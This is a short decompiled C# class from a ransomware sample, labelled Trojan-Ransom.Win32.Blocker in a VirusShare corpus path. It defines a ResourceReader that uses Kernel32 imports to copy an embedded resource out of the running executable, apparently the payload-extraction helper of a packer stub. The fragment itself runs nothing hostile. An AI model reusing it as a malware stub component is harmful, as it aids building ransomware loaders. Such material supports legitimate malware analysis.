// Decompiled with JetBrains decompiler
// Type: oOstub.ResourceReader
// Assembly: oOstub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7C811413-DDA1-421A-9886-E9438E6DDB06
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jgrj-929d982a6d08bd3bbab38fd5617da5fe5d9dafbcf6c89e011e42b409ef5deee6.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace oOstub
{
  internal class ResourceReader
  {
    [DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, ThrowOnUnmappableChar = true, BestFitMapping = false)]
    private static extern IntPtr FindResourceEx(
      IntPtr moduleHandle,
      int type,
      string name,
      ushort language);

    [DllImport("Kernel32.dll", EntryPoint = "SizeofResource", CharSet = CharSet.Unicode, SetLastError = true, ThrowOnUnmappableChar = true, BestFitMapping = false)]
    private static extern int SizeOfResource(IntPtr moduleHandle, IntPtr resInfo);

    [DllImport("Kernel32.dll", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

    [DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, ThrowOnUnmappableChar = true, BestFitMapping = false)]
    public static extern IntPtr LoadResource(IntPtr moduleHandle, IntPtr resInfo);

    public static byte[] ReadResource(int type, string subValue, ushort resourceLanaguge)
    {
      string moduleName = Process.GetCurrentProcess().MainModule.ModuleName;
      IntPtr moduleHandle = ResourceReader.GetModuleHandle(ref moduleName);
      IntPtr resourceEx = ResourceReader.FindResourceEx(moduleHandle, type, subValue, resourceLanaguge);
      IntPtr source = ResourceReader.LoadResource(moduleHandle, resourceEx);
      int length = ResourceReader.SizeOfResource(moduleHandle, resourceEx);
      byte[] destination = new byte[checked (length - 1 + 1 - 1 + 1)];
      Marshal.Copy(source, destination, 0, length);
      return destination;
    }
  }
}
